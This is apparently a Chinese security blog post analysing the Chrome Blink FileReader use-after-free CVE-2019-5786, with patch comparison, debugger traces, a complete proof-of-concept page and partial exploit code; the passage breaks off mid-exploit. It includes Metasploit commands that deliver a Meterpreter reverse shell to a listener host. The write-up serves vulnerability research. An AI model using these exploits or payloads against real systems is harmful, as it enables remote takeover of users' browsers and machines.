[{"title":"CVE-2019-5786","url":"/2021/05/31/CVE-2019-5786/","content":"Blink FileReader UAF漏洞（CVE-2019-5786）一、漏洞信息1、漏洞简述\n漏洞名称：Blink FileReader UAF漏洞（CVE-2019-5786）\n漏洞编号：CVE-2019-5786\n漏洞类型：UAF\n漏洞影响：远程代码执行\nCVSS3.0：N/A\nCVSS2.0：N/A\n漏洞危害等级：严重\n\n2、组件和漏洞概述Blink是Google基于WebKit fork出的自己的渲染引擎。\n3、相关链接https://bugs.chromium.org/p/chromium/issues/detail?id=936448\nhttps://chromium.googlesource.com/chromium/src.git/+/150407e8d3610ff25a45c7c46877333c4425f062%5E%21/\n4、解决方案https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html\n二、漏洞复现1、环境搭建安装72.0.3626.81的Chrome浏览器\n2、复现过程（1）msf复现1、打开msf\nuse exploit/windows/browser/chrome_filereader_uafset payload windows/meterpreter/reverse_tcpset URIPATH /set LHOST 192.168.126.132run\n\n\n2、搭建WIn7 x86环境，安装Chrome在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。访问恶意地址网页。\n\n3、msf出获得session\n\n（2）github公开exp复现搭建win 7 sp1 x86漏洞环境，访问漏洞exp页面，复现结果如下。（复现时个人机器访问iframe.html无法成功弹出计算器，直接访问exploit.html才可以成功的进行复现，仅做记录）\n\n三、漏洞分析1、基本信息\n漏洞文件：third_party/blink/renderer/core/fileapi/file_reader_loader.cc\n漏洞函数：FileReaderLoader::ArrayBufferResult()\n编译后漏洞文件：chrome_child.dll\n编译后漏洞函数：blink::FileReaderLoader::ArrayBufferResult()\n\n2、背景知识（0）FileReader对象前言：\nHTML5的FileReader API可以让客户端浏览器对用户本地文件进行读取，这样就不再需要上传文件由服务器进行读取了，这大大减轻了服务器的负担，也节省了上传文件所需要的时间。\n下面的内容参考[1]\n\n该**FileReader**对象可以异步读取用户计算机上存储的文件（或原始数据缓冲区）的内容,使用[File]或[Blob]对象指定要读取的文件或数据。Blob对象代表不可变的原始数据的类似文件的对象。它们可以读取为文本或二进制数据，也可以转换为Readable Stream。 Blob可以表示不一定是JavaScript本机格式的数据。 File接口基于Blob，继承了Blob功能并将其扩展为支持用户系统上的文件。File提供有关文件的信息，并允许网页中的JavaScript访问其内容。\n\nFileReader相关的状态[1]如下，EMPTY（还未加载）、LOADING（正在加载）、DONE（加载完成）\n\nFileReader有一些内置事件，包括abort、error、load、loadend、loadstart、progress。可以为这些事件自定义处理函数，其中progress事件在读取数据时定期触发，我们可以注册progress事件的回调函数。如果在这时候去获取result，就会在未加载完成时进入FileReaderLoader::ArrayBufferResult函数。如果将要读取的数据的长度设置的稍微大一点，就会在加载的过程中多次回调这个函数。\n\nFileReader.onprogress A handler for the progress event. This event is triggered while reading a Blob content.        FileReader.onloadstart A handler for the loadstart event. This event is triggered each time the reading is starting.\n\n（1）Chrome调试方式（1）确定要调试的进程pid\n因为chrome是多进程模式，所以在调试的时候会有多个chrome进程。可以通过打开Chrome本身的任务管理器（shift+esc）来查看相关信息\n\n通过打开的标签页可以看到我们具体要操作的是哪个pid，这里假如我们的目标是123这个标签页的话，需要调试的pid则为11708。\n\n（2）attach process\n之后就是常规的attach操作了，这里就不贴图了。\n（2）符号服务器以及符号文件配置（1）Chrome\nChrome可以配置系统的环境变量来指定相关的符号服务器[2]，具体操作方法为新增环境变量\n变量名：_NT_SYMBOL_PATH变量值：SRV*c:\\symbols*https://msdl.microsoft.com/download/symbols;SRV*c:\\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com\n\n（2）Chromium\nChromium可以下载相关的pdb文件来进行调试，可以通过[3]下载旧版本的Chromium应用程序以及符号文件等，下图链接参考[4]\n\n（3）代码查看工具sourcegraph该工具可以查看变量的定义和引用等。\n\n（4）Web Worker在chrome中，Worker由v8实现，而非blink，验证如下\n#1.jsif(typeof(Worker)!==&quot;undefined&quot;)&#123;    console.log(&quot;1&quot;);    console.log(typeof(Worker));&#125;else&#123;    console.log(&quot;2&quot;);&#125;\n\nroot@ubuntu:~/v8/v8/out/x64.release# ./d8 1.js 1function\n\n其实这种方式是可以确定js函数是在v8引擎实现的还是在blink引擎实现的，比如\n#1.jsif(typeof(FileReader)!==&quot;undefined&quot;)&#123;    console.log(&quot;1&quot;);    console.log(typeof(FileReader));&#125;else&#123;    console.log(&quot;2&quot;);&#125;\n\nroot@ubuntu:~/v8/v8/out/x64.release# ./d8 1.js 2\n\n而在浏览器中就可以正常的输出，将console.log替换为document.write\n\n扯远了，继续说Web Worker\nJavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。\nWeb Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务，被 Worker 线程负担了，主线程（通常负责 UI 交互）就会很流畅，不会被阻塞或拖慢。\nWorker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。\nWeb Worker 有以下几个使用注意点。\n（1）同源限制\n分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。\n（2）DOM 限制\nWorker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用document、window、parent这些对象。但是，Worker 线程可以navigator对象和location对象。\n（3）通信联系\nWorker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。\n（4）脚本限制\nWorker 线程不能执行alert()方法和confirm()方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。\n（5）文件限制\nWorker 线程无法读取本地文件，即不能打开本机的文件系统（file://），它所加载的脚本，必须来自网络。[6]\n（5）std::move函数原型定义如下\ntemplate &lt;typename T&gt;typename remove_reference&lt;T&gt;::type&amp;&amp; move(T&amp;&amp; t)&#123;\treturn static_cast&lt;typename remove_reference&lt;T&gt;::type&amp;&amp;&gt;(t);&#125;\n\n通过move定义可以看出，move并没有”移动“什么内容，只是将传入的值转换为右值，此外没有其他动作。std::move+移动构造函数或者移动赋值运算符，才能充分起到减少不必要拷贝的意义。\n\nstd::move函数可以以非常简单的方式将左值引用转换为右值引用。（左值、左值引用、右值、右值引用 参见：[7]）\n通过std::move，可以避免不必要的拷贝操作。\nstd::move是为性能而生。\nstd::move是将对象的状态或者所有权从一个对象转移到另一个对象，只是转移，没有内存的搬迁或者内存拷贝。[8]\n还有一份比较详细的解释，参考[9]\n\n对于我们来说，move的作用就是转变所有权的过程，该过程不涉及内存拷贝而只是将某进程或线程的所有权转交给另一个进程或线程。\n调试的过程中发现：所谓std::move并不是简单的替换指针指向，其中也会涉及到内存拷贝的操作以及内存释放的操作，具体为什么节约性能暂时不清楚，下面是当我操作string对象的时候的代码以及内存现场，其中涉及了内存拷贝的操作\n#include &lt;iostream&gt;#include &lt;utility&gt;#include &lt;string&gt;int main()&#123;    std::string str = &quot;Hello&quot;;    std::string str1;    str1 = std::move(str);&#125;\n\n函数调用栈如下，通过调试的过程中，发现std::move的过程是先通过memcpy拷贝内存，之后将原来内存的第一个字符overwrite为0x00，这样原来的str读取后就为空。\n1      vcruntime140d.dll!memcpy(unsigned char * dst, unsigned char * src, unsigned long count)2      test_c++.exe!std::string::_Memcpy_val_from(const std::string &amp; _Right)3      test_c++.exe!std::string::_Take_contents(std::string &amp; _Right, std::integral_constant&lt;bool,1&gt; __formal)4      test_c++.exe!std::string::_Move_assign(std::string &amp; _Right, std::_Equal_allocators __formal)5      test_c++.exe!std::string::operator=(std::string &amp;&amp; _Right)6      test_c++.exe!main()7      test_c++.exe!invoke_main()8      test_c++.exe!__scrt_common_main_seh()9      test_c++.exe!__scrt_common_main()10     test_c++.exe!mainCRTStartup(void * __formal)11     kernel32.dll!@BaseThreadInitThunk@12\u001e()12     ntdll.dll!__RtlUserThreadStart()13     ntdll.dll!__RtlUserThreadStart@8\u001e()\n\n所以不可以单纯的将std::move理解为不含任何空间拷贝或者分配释放，可能它的作用是减少空间拷贝的次数。\n（6）ArrayBuffer Neutering参考[14]\n如何释放一个 ArrayBuffer 的 backing store 。通常而言，可以通过转移 ArrayBuffer （比如转移给另一个线程）来实现底层堆块的释放，这称之为 Neuter 。在 V8 中，ArrayBuffer 提供了 Neuter 方法，代码如下所示：\n/** * Detaches this ArrayBuffer and all its views (typed arrays). * Detaching sets the byte length of the buffer and all typed arrays to zero, * preventing JavaScript from ever accessing underlying backing store. * ArrayBuffer should have been externalized and must be detachable. */void Detach();// TODO(913887): fix the use of &#x27;neuter&#x27; in the API.V8_DEPRECATE_SOON(&quot;Use Detach() instead.&quot;, inline void Neuter()) &#123; Detach(); &#125;/** * Make this ArrayBuffer external. The pointer to underlying memory block * and byte length are returned as |Contents| structure. After ArrayBuffer * had been externalized, it does no longer own the memory block. The caller * should take steps to free memory when it is no longer needed. * * The Data pointer of ArrayBuffer::Contents must be freed using the provided * deleter, which will call ArrayBuffer::Allocator::Free if the buffer * was allocated with ArraryBuffer::Allocator::Allocate. */Contents Externalize();\n\n可以看到，调用 Neuter 时 ArrayBuffer 已经被 Externalized 了，此时 ArrayBuffer 的 backing store 已经被调用方所释放了。\nNeuter 一个 ArrayBuffer 的常规做法是把它转移给一个工作者线程（ Web Workers ）。与桌面软件一样，JavaScript 默认的执行线程为 UI 线程，如果要执行复杂的计算工作，应当新建一个工作者线程来执行任务，以防止 UI 失去响应。\n在 JavaScript 中，各线程之间通过 postMessage 实现数据的发送、通过 onmessage 回调函数实现消息的相应。线程之间的数据传递是通过复制（而不是共享）来实现的，因此传递对象时会经历序列化和反序列化的过程，即传出时进行序列化，传入时进行反序列化。大多数浏览器通过 Structured clone algorithm 来实现这一特性。\n如果要传递的对象实现了 Transferable 接口，那么可以实现数据的高效转移，即并不复制数据，而是通过直接转移所有权来实现传递。对于这种传递方式，因为直接转移了所有权，因此原有线程不再享有对象数据的访问权限。ArrayBuffer 就是以这样的方式转移的，但这里笔者有一个 疑问 ：实际情况中，原有 ArrayBuffer 的 backing store 会被释放，显然在接收线程中会有新的堆块的分配以及数据的复制，并不是简单的修改指针的指向，这和 MDN 的文档描述的高效理念是冲突的。\n线程相关的两个重要概念定义如下：\n\npostMessage 发送消息\nworker.postMessage(message, [transfer]);\n\n\nmessage 表示要传递的数据\n如果有实现了 Transferable 的对象，可以以数组元素的方式放到第二个参数中，以提高传递效率，但是在第一个参数中需要指定一个引用，以方便目标线程接收\n\n\nonmessage 响应消息\nmyWorker.onmessage = function(e) &#123; ... &#125;\n\n\n通过事件的 data 属性访问接收到的数据\n\n\n\n一个简单的例子如下所示：\n&lt;!-- main.html 的代码 --&gt;&lt;script&gt;var ab = new ArrayBuffer(0x1000);var worker = new Worker(&#x27;worker.js&#x27;);console.log(&#x27;Main thread: before postMessage, ab.byteLength is &#x27; + ab.byteLength);worker.postMessage(ab, [ab]);console.log(&#x27;Main thread: after postMessage, ab.byteLength is &#x27; + ab.byteLength);&lt;/script&gt;// worker.js 的代码onmessage = function(message) &#123;    var ab = message.data;    console.log(&#x27;Worker thread: received: &#x27; + ab);    console.log(&#x27;Wroker thread: ArrayBuffer.byteLength is : &#x27; + ab.byteLength);&#125;\n\n输出如下所示：\nMain thread: before postMessage, ab.byteLength is 4096Main thread: after postMessage, ab.byteLength is 0Worker thread: received: [object ArrayBuffer]Wroker thread: ArrayBuffer.byteLength is : 4096\n\nMcAfee Labs 的文章提到，使用 AudioContext.decodeAudioData 同样可以实现 ArrayBuffer 的 Neuter 。\n&lt;script&gt;var ab = new ArrayBuffer(0x1000);var context = new AudioContext();console.log(&#x27;Before decodeAudioData, ab.byteLength is &#x27; + ab.byteLength);context.decodeAudioData(ab,     function(buffer) &#123;        console.log(&#x27;decode succeed: &#x27; + buffer);    &#125;,     function(e) &#123;        console.log(&#x27;decode failed: &#x27; + e);    &#125;);console.log(&#x27;After decodeAudioData, ab.byteLength is &#x27; + ab.byteLength);&lt;/script&gt;\n\n由测试结果可知，不管解码成功与否，ArrayBuffer 都会被转移：\nBefore decodeAudioData, ab.byteLength is 4096After decodeAudioData, ab.byteLength is 0decode failed: EncodingError: Unable to decode audio data\n\n3、补丁比较观察补丁代码，可以发现在if (!finished_loading_)的逻辑上做了修改\n\n补丁前处理逻辑：\nreturn DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());\n\n补丁后处理逻辑\nreturn DOMArrayBuffer::Create(ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));\n\n可以看出一个使用了raw_data_-&gt;ToArrayBuffer()作为参数，另一个使用了ArrayBuffer::Create()的返回值作为参数。\n而commit的信息也提示了我们修复后的代码可能新开辟了一块内存\n\nMerge M72: FileReader: Make a copy of the ArrayBuffer when returning partial results.This is to avoid accidentally ending up with multiple references to thesame underlying ArrayBuffer.\n\n猜测补丁后的Create将原有buffer内容复制到了一个新的buffer上，目的是为了避免多个指针指向同一块内存引发误操作。\n4、漏洞分析（1）静态分析通过代码分析下函数功能。\nDOMArrayBuffer* FileReaderLoader::ArrayBufferResult() &#123;  DCHECK_EQ(read_type_, kReadAsArrayBuffer);  if (array_buffer_result_)    return array_buffer_result_;  // If the loading is not started or an error occurs, return an empty result.  if (!raw_data_ || error_code_ != FileErrorCode::kOK)    return nullptr;  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());  if (finished_loading_) &#123;    array_buffer_result_ = result;    AdjustReportedMemoryUsageToV8(        -1 * static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));    raw_data_.reset();  &#125;  return result;&#125;\n\nFileReaderLoader::ArrayBufferResult函数首先判断文件是否已经全部读取完成，如果已全部读取完成，则返回该缓冲区，如果尚未加载或产生错误，则返回空，如果数据正在被加载，则返回DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer())的返回值。\n修复后的代码如下\nDOMArrayBuffer* FileReaderLoader::ArrayBufferResult() &#123;  DCHECK_EQ(read_type_, kReadAsArrayBuffer);  if (array_buffer_result_)    return array_buffer_result_;  // If the loading is not started or an error occurs, return an empty result.  if (!raw_data_ || error_code_ != FileErrorCode::kOK)    return nullptr;  if (!finished_loading_) &#123;    return DOMArrayBuffer::Create(        ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));  &#125;  array_buffer_result_ = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());  AdjustReportedMemoryUsageToV8(-1 *                                static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));  raw_data_.reset();  return array_buffer_result_;&#125;\n\n修复后的逻辑仅仅在数据正在被加载时的处理不同，它使用了DOMArrayBuffer::Create(ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()))的返回值。\n所以首先查看ToArrayBuffer()函数，首先判断已加载的部分是否等于buffer的长度，如果不满足条件，则调用Slice函数对buffer_进行切割。\n//third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.ccscoped_refptr&lt;ArrayBuffer&gt; ArrayBufferBuilder::ToArrayBuffer() &#123;  // Fully used. Return m_buffer as-is.  if (buffer_-&gt;ByteLength() == bytes_used_)    return buffer_;  return buffer_-&gt;Slice(0, bytes_used_);&#125;\n\n继续查看Slice函数，简单的调用了SliceImpl函数对buffer_进行处理。\nscoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::Slice(int begin, int end) const &#123;  return SliceImpl(ClampIndex(begin), ClampIndex(end));&#125;\n\n这里的ClampIndex函数作用为对参数值进行处理，首先将小于0的参数转换成从后面计算的偏移，之后再将参数限定在0和ByteLength()之间。其目的就是对参数进行处理\nunsigned ArrayBuffer::ClampIndex(int index) const &#123;  unsigned current_length = ByteLength();  if (index &lt; 0)    index = static_cast&lt;int&gt;(current_length + index);  return ClampValue(index, 0, current_length);&#125;unsigned ArrayBuffer::ClampValue(int x, unsigned left, unsigned right) &#123;  DCHECK_LE(left, right);  unsigned result;  if (x &lt; 0)    result = left;  else    result = static_cast&lt;unsigned&gt;(x);  if (result &lt; left)    result = left;  if (right &lt; result)    result = right;  return result;&#125;\n\n继续跟进SliceImpl函数，该函数调用了ArrayBuffer::Create函数，以static_cast&lt;const char*&gt;(Data()) + begin与长度作为参数。\nscoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::SliceImpl(unsigned begin, unsigned end) const &#123;  size_t size = static_cast&lt;size_t&gt;(begin &lt;= end ? end - begin : 0);  return ArrayBuffer::Create(static_cast&lt;const char*&gt;(Data()) + begin, size);&#125;\n\n查看下Data()的定义，发现是将buffer的数据返回，\nvoid* ArrayBuffer::Data() &#123;  return contents_.Data();&#125;\n\n再看下ArrayBuffer::Create函数，该函数的作用就是创建一个buffer，并将之前的数据拷贝进去。\nscoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::Create(const void* source, size_t byte_length) &#123;  ArrayBufferContents contents(byte_length, 1, ArrayBufferContents::kNotShared, ArrayBufferContents::kDontInitialize);  if (UNLIKELY(!contents.Data()))    OOM_CRASH();  scoped_refptr&lt;ArrayBuffer&gt; buffer = base::AdoptRef(new ArrayBuffer(contents));  memcpy(buffer-&gt;Data(), source, byte_length);  return buffer;\t\t\t\t\t//调试时发现，在32位程序中，buffer-&gt;Data()的地址每回都在变化，有时候可能会重用，而source的地址是固定的&#125;\n\n这时我们从该函数抽出，返回到最开始代码位置，查看DOMArrayBuffer* Create函数逻辑\n#third_party/blink/renderer/core/fileapi/file_reader_loader.ccDOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());#third_party/blink/renderer/core/typed_arrays/dom_array_buffer.hstatic DOMArrayBuffer* Create(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer) &#123;    return MakeGarbageCollected&lt;DOMArrayBuffer&gt;(std::move(buffer));&#125;\n\n可以看出通过std::move操作了buffer缓冲区，关于std::move在背景知识的第5部分已经进行了描述，这里的作用是将该缓冲区的所有权从主线程转移到了worker线程。\n（2）动态调试（1）触发相关函数首先编写代码触发函数调用，通过动态调试查看我们关心的数据结构并理清程序的执行流\n&lt;script&gt;const string_size = 128 * 1024 * 1024;let contents = String.prototype.repeat.call(&#x27;Z&#x27;, string_size);let blob = new Blob([contents]);let reader = new FileReader();\treader.onprogress = function(evt) &#123;\tconsole.log(`[onprogress] read length = 0x$&#123;evt.target.result.byteLength.toString(0x10)&#125;`);&#125;reader.onloadend = function(evt) &#123;\tconsole.log(`[onloadend] read length = 0x$&#123;evt.target.result.byteLength.toString(0x10)&#125;`);&#125;reader.readAsArrayBuffer(blob);&lt;/script&gt;&gt;\n\n执行结果如下，可以看出onprogress和onloadend都会处理长度为0x8000000的情况\n\n动态调试分析下源代码中下面的这段逻辑代码：\nDOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());\n\n查看ArrayBuffer::Create()函数的返回值。返回的是一个buffer结构体简介指针，可以通过这个指针获取到ByteLength()和Data()。\n\n而这个返回值我们关心的内存地址可以通过下面的表达式获取，其中偏移0x4的位置为data数据存放位置，偏移0x8的位置为返回的buffer的大小\n0:000&gt; dd eax L4009cedb8  49c04f20 009cedbc d1bd2bff 3b0937a00:000&gt; dd poi(poi(eax)+4) L449c68220  00000001 1c204000 07300000 10e9de4c\n\n再经由上层的DOMArrayBuffer::Create()函数处理之后，返回值为0x58954e00。同样可以通过这个指针获取到ByteLength()和Data()。\n\n0:000&gt; dd eax L458954e00  1331e300 00000000 49c04f20 000000000:000&gt; dd poi(poi(eax+0x8)+0x4) L449c68220  00000001 1c204000 07300000 10e9de4c\n\nToArrayBuffer()函数调用了ArrayBuffer::Create()函数来分配buffer，而ArrayBuffer::Create()的返回值实际上也正是ToArrayBuffer()的返回值。是上面的0x009cedb8，将该返回值作为DOMArrayBuffer::Create()函数的参数，该函数同样得到了一个返回值0x58954e00。\n（2）简单梳理简单梳理下代码静态分析以及刚刚动态调试得到的结果。还是拿之前的FileReaderLoader::ArrayBufferResult()代码进行描述：\nDOMArrayBuffer* FileReaderLoader::ArrayBufferResult() &#123;  DCHECK_EQ(read_type_, kReadAsArrayBuffer);  if (array_buffer_result_)    return array_buffer_result_;  // If the loading is not started or an error occurs, return an empty result.  if (!raw_data_ || error_code_ != FileErrorCode::kOK)    return nullptr;  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());  if (finished_loading_) &#123;    array_buffer_result_ = result;    AdjustReportedMemoryUsageToV8(        -1 * static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));    raw_data_.reset();  &#125;  return result;&#125;\n\n由于先执行了DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());再对 finished_loading_进行判断以对array_buffer_result_进行赋值，之后在代码的最上面对 array_buffer_result_ 进行判断，所以就存在这样一个问题：文件加载完成后，ToArrayBuffer逻辑中对buffer_-&gt;ByteLength与bytes_used_是否相等的判断才会成功，从而从而直接返回缓冲区的指针，否则返回指向该缓冲区副本的指针。我们聚焦下直接返回缓冲区的指针的情况，此时返回的指针result可以间接指向buffer的缓冲区，之后finished_loading_加载完成，执行了语句 array_buffer_result_ = result; 这样我们下次进入该函数时，通过了第三行代码的判断，直接放回间接指向buffer缓冲区的指针，此时原来的result指针也可以操作buffer缓冲区，由于两个指针可以同时操作一块地址空间，这就造成了UAF。\n下面是调试记录\n\n#下面的四个内存分布对应了上面的四次事件触发0:000&gt; dd eax58957318  1331e300 00000000 49c04680 000000000:000&gt; dd eax58957328  1331e300 00000000 49c04820 000000000:000&gt; dd eax58957338  1331e300 00000000 49c04820 000000000:000&gt; dd esi58957338  1331e300 09551ff8 49c04820 000000000:000&gt; dd 49c0468049c04680  00000001 49c6a560 00000000 000000000:000&gt; dd 49c0482049c04820  00000002 49c6a4c0 00000000 000000000:000&gt; dd 49c0482049c04820  00000003 49c6a4c0 00000000 000000000:000&gt; dd 49c0482049c04820  00000002 49c6a4c0 00000000 000000000:000&gt; dd 49c6a56049c6a560  00000001 a0204000 07ff0000 10e9de4c\t\t\t#第一次为bytes_used_还小于buffer_-&gt;ByteLength时，此时偏移0x8位置为临时buffer0:000&gt; dd 49c6a4c049c6a4c0  00000001 80004000 08000000 10e9de4c\t\t\t#后面三次为bytes_used_等于buffer_-&gt;ByteLength时，此时偏移0x8位置为真实要操作的buffer0:000&gt; dd 49c6a4c049c6a4c0  00000001 80004000 08000000 10e9de4c0:000&gt; dd 49c6a4c049c6a4c0  00000001 80004000 08000000 10e9de4c#此时可见58957328与58957338两个指针都可以操作49c04820这块空间，进而控制buffer，如果释放掉其中一个而使用另外一个，则会造成UAF。0:000&gt; dd 5895732858957328  1331e300 095520d8 49c04820 00a8001058957338  1331e300 09551ff8 49c04820 00000000\n\n对上面的内存现场进行分析\n\n1、第一次尚未读取完成，返回的指针指向临时buffer中。大小0x07ff0000。\n2、第二次读取完成，但是此时finished_loading_还未置为1，返回真实buffer。大小0x08000000。\n3、第三次读取完成，此时finished_loading_已经置为1，并对array_buffer_result_进行了赋值。返回真实buffer。大小0x08000000。与2的指针值不相同。\n2、第四次读取完成，触发onloadend，返回真实buffer。大小0x08000000，与3的指针值相同。\n\n简单来说就是由于逻辑错误使两个指针可以操作同一块内存，而且可以发现最后两个onprogress指针地址就是不相同的，而onloadend与最后一个onprogress的指针是相同的。所以poc或者exp的构造方式就有两种情况：\n\n1、找到最后两个相同大小的onprogress指针进行操作。（下面exp的方式）\n2、找到倒数第二个onprogress指针与onloadend指针进行操作，当然也需要这两个指针指向的长度相同。（下面poc的方式）\n\n（3）POC分析代码如下，这里的代码参考[14]\n&lt;!-- poc.html --&gt;&lt;script&gt;var ab1, ab2;var byteLength = 100 * 1024 * 1024;function onProgress(event) &#123;    if (ab1.byteLength != byteLength) &#123;        ab1 = event.target.result;\t\t\t//event.target.result：事件的元素    &#125;&#125;function onLoadEnd(event) &#123;    ab2 = event.target.result;    if (ab1 != ab2 &amp;&amp; ab1.byteLength == ab2.byteLength) &#123;\t\t\t//这里判断下ab1和ab2的指针是否相同，但是我在调试中发现event.target.result返回的是type，不是很能理解        var flag = 0x61616161;        new DataView(ab1).setUint32(0, flag, true);\t\t\t\t\t//这里将前四个字节改成0x61616161        if (new DataView(ab2).getUint32(0, true) == flag) &#123;\t\t\t//这里验证下ab1和ab2是否可以操作同一块空间            console.log(&#x27;verify succeed! try crash self...&#x27;);            crash();\t\t\t\t\t\t\t\t\t\t\t\t//尝试触发崩溃。            return;        &#125; else &#123;            console.log(&#x27;verify failed, retry now...&#x27;);        &#125;    &#125; else &#123;        console.log(&#x27;failed this time, retry now...&#x27;);    &#125;    window.setTimeout(init, 1000);\t\t\t\t\t\t\t\t\t//如果验证失败则会重新进行尝试&#125;    function init() &#123;    ab1 = ab2 = new ArrayBuffer(0);    var string = &#x27;A&#x27;.repeat(byteLength);    var blob = new Blob([string]);\t\t\t\t//这里的Blob为Binary Large Object的缩写，File继承自Blob    var reader = new FileReader();    reader.onprogress = onProgress;    reader.onloadend = onLoadEnd;    reader.readAsArrayBuffer(blob);\t\t\t\t//FileReader.readAsText()可以轻易地处理一个300k的日志文件，但当日志文件有1G到2G那么大，浏览器就会崩溃。这是因为readAsText()会一下子把目标文件加载至内存，导致内存超出上限。所以如果Web应用常常需要处理大文件时，我们应该使用FileReader.readAsArrayBuffer()来一块一块读取文件。而onProgress每当读取blob时就会触发，而onloadend为当文件加载或读取完成后触发。&#125;function crash() &#123;    var worker = new Worker(&#x27;worker.js&#x27;);    try &#123;        worker.postMessage(ab1, [ab1, ab2]);\t\t\t//核心是通过postmessage进行触发crash，postmessage定义参考[15]，其中第一个参数为aMessage，表示要发送的消息（可能是变量值也可能是结构体），第二个参数为transferList，这个参数可选，用于传递所有权。如果一个对象的所有权被转移，在发送它的上下文中将变为不可用（中止），并且只有在它被发送到的worker中可用。转移所有权这个过程中所以我们在转移ab1的所有权后再转移ab2时会抛出异常。调试时发现postMessage调用了chrome_child!WTF::ArrayBufferContents::FreeMemory函数释放掉了内存    &#125; catch(e) &#123;        var errmsg = &#x27;ArrayBuffer at index 1 could not be transferred&#x27;;        if (e.message.indexOf(errmsg) != -1) &#123;            var dv = new DataView(ab2);            dv.setUint32(4, 0x42424242, true);\t\t\t//此时再对该空间进行写操作即可触发UAF        &#125; else &#123;            window.setTimeout(init, 1000);        &#125;    &#125;&#125;init();&lt;/script&gt;\n\nonmessage = function(message) &#123;&#125;\n\npoc思路已经再poc注释中描述的很清晰了，核心思路就是通过onProgress和onLoadEnd得到两个可以指向相同结构体的指针，然后通过postMessage释放其中的一个指针，之后再使用了第二个指针触发漏洞。\n运行查看可用性，发现成功触发crash\n\n附加windbg，可以查看到相关内存现场\n0:000&gt; g(8b4.1ea4): Access violation - code c0000005 (!!! second chance !!!)eax=00000004 ebx=008fe6a8 ecx=00000042 edx=00000042 esi=00000042 edi=13e04000eip=106dbd06 esp=0053eb2c ebp=0053eb54 iopl=0         nv up ei pl nz na po nccs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202chrome_child!Builtins_DataViewPrototypeSetUint32+0x386:106dbd06 881407          mov     byte ptr [edi+eax],dl      ds:002b:13e04004=??0:000&gt; dd edi L113e04000  ????????\n\n此时edi指向的内存已经被释放了，当使用另一块指向同样内存的指针时将会触发访问错误。\n（4）exp分析exp打印日志如下，详细代码见[13]\nhello, world!exploit.js:332 Array buffer allocation failedexploit.js:341 attempt 0 startedexploit.js:289 onloadend attempt 1 after 76 onprogress callbacksexploit.js:54 found possible candidate objectat idx 4190250exploit.js:188 leaked absolute address of our object 5e0009cexploit.js:189 leaked absolute address of ta 4e04000exploit.js:70 found object idx in the spray array: 201 816exploit.js:199 addrof(reader_obj) == 98566301exploit.js:110 found corruptable Uint32Array-&gt;elements at 4ec1118, on Uint32Array idx 17 837exploit.js:246 success\n\nexp分析步骤参考[11]，[15]\n（1）分配128Mib字符串分配一个较大的字符串（128MiB），它将用作传递给FileReader的Blob的源。该分配将最终在自下而上的分配之后在自由区域中进行（从上面列出的地址空间中的36690000开始）。\nconst string_size = 128 * 1024 * 1024;let contents = String.prototype.repeat.call(&#x27;Z&#x27;, string_size);let f = new File([contents], &quot;text.txt&quot;);\n\n（2） 堆布局在32位win7系统中通过申请1GB的ArrayBuffer，Chrome会尝试释放512MB保留内存，而分配失败的OOM异常可以被脚本捕获使得render进程不会crash，最终导致前面申请的128MB的ArrayBuffer在这块512MB内存上分配，不受隔离堆保护，释放后可以被其他js对象占位。\ntry &#123;    let failure = new ArrayBuffer(1024 * 1024 * 1024);      &#125; catch (e) &#123;    console.log(e.message);&#125;\n\n（3）获取触发UAF的两个指针调用FileReader.readAsArrayBuffer。将触发多个onprogress事件，如果事件的时间安排正确，则最后两个事件可以返回对同一基础ArrayBuffer的引用。可以无限重复此步骤，直到成功为止，而不会导致过程崩溃。\nreader.onprogress = function(evt) &#123;    force_gc();    let res = evt.target.result;    // console.log(`onprogress $&#123;onprogress_cnt&#125;`);    onprogress_cnt += 1;        if (res.byteLength != f.size) &#123;        // console.log(`result has a different size than expected: $&#123;res.byteLength&#125;`);        return;    &#125;    lastlast = last;       last = res;&#125;\n\n    reader.onloadend = function(evt) &#123;        try_cnt += 1;        failure = false;         if (onprogress_cnt &lt; 2) &#123;            console.log(`less than 2 onprogress events triggered: 